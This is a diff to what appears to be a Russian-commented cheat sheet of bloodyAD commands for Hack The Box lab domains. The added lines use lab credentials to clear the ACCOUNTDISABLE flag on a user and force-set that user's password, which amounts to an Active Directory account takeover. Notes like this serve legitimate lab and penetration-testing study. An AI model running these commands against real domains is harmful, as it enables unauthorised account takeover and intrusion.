@@ -205,3 +205,10 @@ python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_
 
 # Команда используется для получения информации об объекте Active Directory с именем javier.mmarshall в домене mirage.htb. 
     bloodyAD --host dc01.mirage.htb -u mark.bbond -p '1day@atime' -k -d mirage.htb get object javier.mmarshall
+
+# Убрать или заменить атрибут ACCOUNTDISABLE
+    bloodyAD -u mark.bbond -p '1day@atime' --host dc01.mirage.htb -d mirage.htb -k remove uac javier.mmarshall -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
+
+# Заменить Password
+    bloodyAD -u mark.bbond -p '1day@atime' --host dc01.mirage.htb -d mirage.htb -k set password javier.mmarshall 'Password123'
